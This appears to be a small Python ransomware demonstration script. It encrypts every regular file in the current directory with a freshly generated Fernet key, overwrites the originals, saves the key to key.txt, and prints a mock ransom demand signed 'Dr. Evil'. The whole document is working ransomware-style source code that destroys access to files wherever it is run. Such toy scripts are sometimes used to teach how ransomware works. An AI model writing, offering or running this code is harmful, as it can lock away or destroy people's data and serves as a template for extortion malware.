#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []
# Iterate through each file except encryption and decryption scripts, and the decryption key file
for file in os.listdir():
	if file =="encrypt.py" or file == "key.txt" or file == "decrypt.py":
		continue
	if os.path.isfile(file): # checks if item is a file not a folder and adds it to the files array
		files.append(file)


key = Fernet.generate_key() # generate a key used for encryption/decryption and save as variable 'key'


with open("key.txt", "wb") as  cryptkey:
	cryptkey.write(key) # Write the key to the key.txt file

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read() # Open each file and read the contents
	contents_encrypted = Fernet(key).encrypt(contents) # Encrypt the contents of the file using the key
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted) # write the encrypted contents back into the file
        
print("The below files have all been encrypted. Pay me 1 Billion Dollars to receive the decryption code or you'll lose them forever! - Dr. Evil\n")
print(files)
